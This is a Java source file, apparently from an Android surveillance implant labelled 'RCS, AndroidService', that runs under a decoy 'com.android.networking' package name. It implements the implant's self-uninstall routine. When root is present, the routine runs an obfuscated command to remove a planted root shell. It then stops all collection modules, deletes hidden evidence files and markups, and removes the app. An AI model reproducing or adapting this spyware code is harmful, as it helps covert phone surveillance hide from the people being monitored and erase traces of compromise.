/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : UninstallAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.action;

import android.content.Intent;
import android.net.Uri;

import com.android.networking.Core;
import com.android.networking.Messages;
import com.android.networking.Status;
import com.android.networking.Trigger;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfAction;
import com.android.networking.evidence.EvidenceCollector;
import com.android.networking.evidence.Markup;
import com.android.networking.manager.ManagerEvent;
import com.android.networking.manager.ManagerModule;
import com.android.networking.util.Check;

/**
 * The Class UninstallAction.
 */
public class UninstallAction extends SubActionSlow {

	private static final String TAG = "UninstallAction"; //$NON-NLS-1$

	/**
	 * Instantiates a new uninstall action.
	 * 
	 * @param params
	 *            the conf params
	 */
	public UninstallAction(final ConfAction params) {
		super(params);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute(Trigger trigger) {
		Status.self().uninstall = true;
		return true;
	}

	/**
	 * Actual execute.
	 */
	public static boolean actualExecute() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualExecute): uninstall");//$NON-NLS-1$
		}

		final Markup markup = new Markup(0);
		markup.createEmptyMarkup();

		if (Status.self().haveRoot() == true) {
			Process localProcess;

			try {
				// /system/bin/ntpsvd ru (uninstall root shell)
				localProcess = Runtime.getRuntime().exec(Messages.getString("32.32"));

				localProcess.waitFor();
			} catch (Exception e) {
				if (Cfg.EXP) {
					Check.log(e);
				}
			}
		}

		boolean ret = stopServices();

		ret &= removeFiles();
		ret &= deleteApplication();

		return ret;
	}

	/**
	 * Stop agents and events
	 * 
	 * @return
	 */
	static boolean stopServices() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stopServices)");//$NON-NLS-1$
		}

		ManagerModule.self().stopAll();
		ManagerEvent.self().stopAll();
		Status.self().unTriggerAll();
		return true;
	}

	/**
	 * Remove markups and logs
	 * 
	 * @return
	 */
	static boolean removeFiles() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (removeFiles)");//$NON-NLS-1$
		}

		Markup.removeMarkups();

		final int fileNum = EvidenceCollector.self().removeHidden();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (removeFiles): " + fileNum);//$NON-NLS-1$
		}
		return true;
	}

	/**
	 * Deletes the application
	 * 
	 * @return
	 */
	static boolean deleteApplication() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (deleteApplication)");//$NON-NLS-1$
		}

		// Core core = Core.self();
		// Messages.getString("2.0") : 2.0=package:com.android.networking
		final Uri packageURI = Uri.parse("package:" + Status.self().getAppContext().getPackageName()); //$NON-NLS-1$

		if (Cfg.DEBUG) {
			Check.log(TAG + " (deleteApplication): " + packageURI.toString());
		}
		
		final Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
		uninstallIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		Status.getAppContext().startActivity(uninstallIntent);
		return true;
	}

	@Override
	protected boolean parse(ConfAction params) {
		return true;
	}

}
